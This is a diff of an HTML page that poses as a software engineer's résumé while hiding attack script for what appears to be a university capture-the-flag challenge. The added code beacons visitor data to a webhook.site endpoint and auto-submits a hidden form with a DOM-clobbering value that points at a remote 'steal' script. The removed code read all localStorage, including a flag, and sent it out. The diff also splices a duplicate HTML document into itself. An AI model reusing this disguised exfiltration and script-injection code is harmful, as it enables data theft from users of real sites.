@@ -20,9 +20,154 @@
                  📧 michael.thompson@protonmail.com | 📱 (410) 555-0199
              </div>
 
-             <!-- CRITICAL: DOM Clobbering element for CTF -->
-             <div style="position: fixed; left: -10000px; visibility: hidden; opacity: 0;">
-                 <input id="utilsJS" name="url" value="https://gavinyw.github.io/resume-portfolio/updated_steal.js">
+             <h2>Professional Summary</h2>
+             <p>Experienced software engineer with 12+ years in web development, cybersecurity, and team leadership.
+     Specializes in secure applications and penetration testing.</p>
+
+             <h2>Work Experience</h2>
+             <ul>
+                 <li><strong>Senior Software Engineer</strong> - CyberSec Solutions Inc. (2021-2024)</li>
+                 <li><strong>Full Stack Developer</strong> - TechStart Innovations (2019-2021)</li>
+                 <li><strong>Software Developer</strong> - WebCorp Agency (2017-2019)</li>
+             </ul>
+
+             <h2>Technical Skills</h2>
+             <p>JavaScript, Python, React, Node.js, PostgreSQL, Docker, AWS, Security Testing, Penetration Testing</p>
+
+             <h2>Education</h2>
+             <p><strong>B.S. Computer Science</strong> - University of Maryland (2017)</p>
+
+             <div style="text-align: center; margin-top: 40px; color: #666;">
+                 <p>Thank you for reviewing my application. I look forward to discussing opportunities.</p>
+             </div>
+         </div>
+
+         <script>
+             console.log('GITHUB PAGES - REDIRECTING TO CTF DOMAIN');
+
+             // CORS-FREE webhook function
+             function sendWebhook(data) {
+                 try {
+                     const img = new Image();
+                     const params = new URLSearchParams();
+                     Object.keys(data).forEach(key => {
+                         params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
+                     });
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/redirect-flow?' + params.toString();
+                     document.body.appendChild(img);
+                     console.log('Status sent:', data.status);
+                 } catch(e) { console.error('Webhook failed:', e); }
+             }
+
+             // Send initial confirmation
+             sendWebhook({
+                 status: 'GITHUB_PAGES_LOADED_REDIRECT_STRATEGY',
+                 timestamp: new Date().toISOString(),
+                 current_domain: window.location.hostname,
+                 current_url: window.location.href,
+                 user_agent: navigator.userAgent,
+                 strategy: 'redirect_to_ctf_domain'
+             });
+
+             // Create a form that will POST DOM clobbering data to CTF
+             const form = document.createElement('form');
+             form.method = 'POST';
+             form.action = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/submit';
+             form.style.display = 'none';
+
+             // Add the DOM clobbering element as a hidden input
+             const clobberingInput = document.createElement('input');
+             clobberingInput.type = 'hidden';
+             clobberingInput.name = 'utilsJS';
+             clobberingInput.value = 'https://gavinyw.github.io/resume-portfolio/updated_steal.js';
+
+             // Add normal form fields
+             const nameInput = document.createElement('input');
+             nameInput.type = 'hidden';
+             nameInput.name = 'id';
+             nameInput.value = 'Michael Thompson';
+
+             const titleInput = document.createElement('input');
+             titleInput.type = 'hidden';
+             titleInput.name = 'title';
+             titleInput.value = 'Senior Software Engineer';
+
+             const locationInput = document.createElement('input');
+             locationInput.type = 'hidden';
+             locationInput.name = 'location';
+             locationInput.value = 'Baltimore';
+
+             const phoneInput = document.createElement('input');
+             phoneInput.type = 'hidden';
+             phoneInput.name = 'phone';
+             phoneInput.value = '410-555-0199';
+
+             const urlInput = document.createElement('input');
+             urlInput.type = 'hidden';
+             urlInput.name = 'url';
+             urlInput.value = 'https://gavinyw.github.io/resume-portfolio/';
+
+             form.appendChild(clobberingInput);
+             form.appendChild(nameInput);
+             form.appendChild(titleInput);
+             form.appendChild(locationInput);
+             form.appendChild(phoneInput);
+             form.appendChild(urlInput);
+             document.body.appendChild(form);
+
+             // Send webhook about form creation
+             sendWebhook({
+                 status: 'FORM_CREATED_FOR_CTF_SUBMISSION',
+                 timestamp: new Date().toISOString(),
+                 form_action: form.action,
+                 clobbering_payload: clobberingInput.value
+             });
+
+             // Submit the form after a delay
+             setTimeout(() => {
+                 sendWebhook({
+                     status: 'SUBMITTING_TO_CTF_DOMAIN',
+                     timestamp: new Date().toISOString(),
+                     target: 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/submit'
+                 });
+
+                 form.submit();
+             }, 2000);
+
+             // Also try direct redirect as backup
+             setTimeout(() => {
+                 const ctfUrl = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
+
+                 sendWebhook({
+                     status: 'BACKUP_REDIRECT_TO_CTF_MESSAGES',
+                     timestamp: new Date().toISOString(),
+                     target_url: ctfUrl
+                 });
+
+                 window.location.href = ctfUrl;
+             }, 5000);
+         </script>
+     </body>
+     </html>     <!DOCTYPE html>
+     <html>
+     <head>
+         <title>Michael Thompson - Senior Software Engineer</title>
+         <meta charset="UTF-8">
+         <style>
+             body { font-family: Arial, sans-serif; margin: 0; padding: 40px; background: #f4f4f4; }
+             .resume { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; }
+             h1 { color: #2c3e50; margin: 0; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
+             .contact { color: #666; margin: 15px 0; }
+             h2 { color: #34495e; margin-top: 30px; }
+             ul { line-height: 1.8; }
+         </style>
+     </head>
+     <body>
+         <div class="resume">
+             <h1>Michael Thompson</h1>
+             <div class="contact">
+                 <strong>Senior Software Engineer</strong> | Baltimore, MD<br>
+                 📧 michael.thompson@protonmail.com | 📱 (410) 555-0199
              </div>
 
              <h2>Professional Summary</h2>
@@ -48,9 +193,9 @@
          </div>
 
          <script>
-             console.log('LIVE CTF ATTACK - NEW WEBHOOK - Direct Flag Extraction');
+             console.log('GITHUB PAGES - REDIRECTING TO CTF DOMAIN');
 
-             // CORS-FREE webhook function with NEW URL
+             // CORS-FREE webhook function
              function sendWebhook(data) {
                  try {
                      const img = new Image();
@@ -58,7 +203,7 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/live-ctf?' + params.toString();
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/redirect-flow?' + params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
                  } catch(e) { console.error('Webhook failed:', e); }
@@ -66,101 +211,91 @@
 
              // Send initial confirmation
              sendWebhook({
-                 status: 'LIVE_CTF_ATTACK_START_NEW_WEBHOOK',
+                 status: 'GITHUB_PAGES_LOADED_REDIRECT_STRATEGY',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
                  current_url: window.location.href,
-                 clobbering_ready: !!window.utilsJS,
-                 clobbering_url: window.utilsJS?.url || window.utilsJS?.value || 'not_found',
                  user_agent: navigator.userAgent,
-                 referrer: document.referrer || 'none',
-                 webhook_version: 'NEW_WEBHOOK_V2'
+                 strategy: 'redirect_to_ctf_domain'
              });
 
-             // IMMEDIATE FLAG EXTRACTION (if on CTF domain)
+             // Create a form that will POST DOM clobbering data to CTF
+             const form = document.createElement('form');
+             form.method = 'POST';
+             form.action = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/submit';
+             form.style.display = 'none';
+
+             // Add the DOM clobbering element as a hidden input
+             const clobberingInput = document.createElement('input');
+             clobberingInput.type = 'hidden';
+             clobberingInput.name = 'utilsJS';
+             clobberingInput.value = 'https://gavinyw.github.io/resume-portfolio/updated_steal.js';
+
+             // Add normal form fields
+             const nameInput = document.createElement('input');
+             nameInput.type = 'hidden';
+             nameInput.name = 'id';
+             nameInput.value = 'Michael Thompson';
+
+             const titleInput = document.createElement('input');
+             titleInput.type = 'hidden';
+             titleInput.name = 'title';
+             titleInput.value = 'Senior Software Engineer';
+
+             const locationInput = document.createElement('input');
+             locationInput.type = 'hidden';
+             locationInput.name = 'location';
+             locationInput.value = 'Baltimore';
+
+             const phoneInput = document.createElement('input');
+             phoneInput.type = 'hidden';
+             phoneInput.name = 'phone';
+             phoneInput.value = '410-555-0199';
+
+             const urlInput = document.createElement('input');
+             urlInput.type = 'hidden';
+             urlInput.name = 'url';
+             urlInput.value = 'https://gavinyw.github.io/resume-portfolio/';
+
+             form.appendChild(clobberingInput);
+             form.appendChild(nameInput);
+             form.appendChild(titleInput);
+             form.appendChild(locationInput);
+             form.appendChild(phoneInput);
+             form.appendChild(urlInput);
+             document.body.appendChild(form);
+
+             // Send webhook about form creation
+             sendWebhook({
+                 status: 'FORM_CREATED_FOR_CTF_SUBMISSION',
+                 timestamp: new Date().toISOString(),
+                 form_action: form.action,
+                 clobbering_payload: clobberingInput.value
+             });
+
+             // Submit the form after a delay
              setTimeout(() => {
-                 try {
-                     const flag = localStorage.getItem('flag');
-                     const allStorage = {};
-                     for (let i = 0; i < localStorage.length; i++) {
-                         const key = localStorage.key(i);
-                         allStorage[key] = localStorage.getItem(key);
-                     }
+                 sendWebhook({
+                     status: 'SUBMITTING_TO_CTF_DOMAIN',
+                     timestamp: new Date().toISOString(),
+                     target: 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/submit'
+                 });
 
-                     sendWebhook({
-                         status: 'IMMEDIATE_FLAG_EXTRACTION_V2',
-                         timestamp: new Date().toISOString(),
-                         flag: flag || 'not_found',
-                         all_localStorage: JSON.stringify(allStorage),
-                         localStorage_length: localStorage.length,
-                         domain: window.location.hostname,
-                         port: window.location.port || 'default'
-                     });
-
-                     if (flag) {
-                         sendWebhook({
-                             status: 'FLAG_CAPTURED_IMMEDIATE_V2',
-                             flag: flag,
-                             timestamp: new Date().toISOString(),
-                             method: 'immediate_extraction_new_webhook'
-                         });
-                     }
-                 } catch(e) {
-                     sendWebhook({
-                         status: 'IMMEDIATE_EXTRACTION_ERROR_V2',
-                         error: e.message,
-                         timestamp: new Date().toISOString()
-                     });
-                 }
-             }, 1000);
-
-             // DOM Clobbering execution
-             setTimeout(() => {
-                 console.log('Executing DOM clobbering strategy...');
-
-                 if (window.utilsJS && (window.utilsJS.url || window.utilsJS.value)) {
-                     sendWebhook({
-                         status: 'DOM_CLOBBERING_EXECUTING_V2',
-                         timestamp: new Date().toISOString(),
-                         script_url: window.utilsJS.url || window.utilsJS.value
-                     });
-
-                     // Simulate the vulnerable loadMessageBoardJS function
-                     let utilJS = window.utilsJS || {};
-                     let scriptSrc = utilJS.url || utilJS.value;
-
-                     if (scriptSrc) {
-                         console.log('Loading payload script:', scriptSrc);
-                         let script = document.createElement('script');
-                         script.src = scriptSrc;
-                         document.body.appendChild(script);
-
-                         sendWebhook({
-                             status: 'PAYLOAD_SCRIPT_LOADED_V2',
-                             timestamp: new Date().toISOString(),
-                             script_src: scriptSrc
-                         });
-                     }
-                 } else {
-                     sendWebhook({
-                         status: 'DOM_CLOBBERING_FAILED_V2',
-                         timestamp: new Date().toISOString(),
-                         utilsJS_exists: !!window.utilsJS
-                     });
-                 }
+                 form.submit();
              }, 2000);
 
-             // Navigate to messages section
+             // Also try direct redirect as backup
              setTimeout(() => {
-                 if (window.location.hash !== '#messages') {
-                     window.location.hash = '#messages';
-                     sendWebhook({
-                         status: 'NAVIGATED_TO_MESSAGES_V2',
-                         timestamp: new Date().toISOString(),
-                         full_url: window.location.href
-                     });
-                 }
-             }, 4000);
+                 const ctfUrl = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
+
+                 sendWebhook({
+                     status: 'BACKUP_REDIRECT_TO_CTF_MESSAGES',
+                     timestamp: new Date().toISOString(),
+                     target_url: ctfUrl
+                 });
+
+                 window.location.href = ctfUrl;
+             }, 5000);
          </script>
      </body>
      </html>
